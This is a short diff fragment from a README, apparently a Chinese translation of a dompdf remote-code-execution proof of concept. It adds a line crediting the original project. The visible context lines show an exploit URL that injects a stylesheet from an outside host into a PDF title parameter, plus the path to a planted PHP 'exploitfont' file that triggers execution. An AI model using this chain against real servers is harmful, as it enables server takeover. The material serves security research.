@@ -19,3 +19,4 @@ http://localhost:9000/index.php?pdf&title=<link rel=stylesheet href='http://vpsi
 ```
 http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php
 ```
+该项目转载自https://github.com/positive-security/dompdf-rce并翻译。
